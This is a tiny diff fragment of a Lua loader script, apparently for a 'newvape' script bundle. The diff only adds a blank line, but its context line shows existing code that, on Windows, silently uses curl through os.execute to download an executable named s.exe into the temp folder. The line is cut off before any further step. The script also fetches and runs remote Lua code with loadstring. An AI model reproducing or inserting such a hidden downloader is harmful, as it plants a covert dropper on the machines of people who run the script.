@@ -67,3 +67,4 @@ if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https:
 end
 
 return loadstring(downloadFile('newvape/main.lua'), 'main')()
+
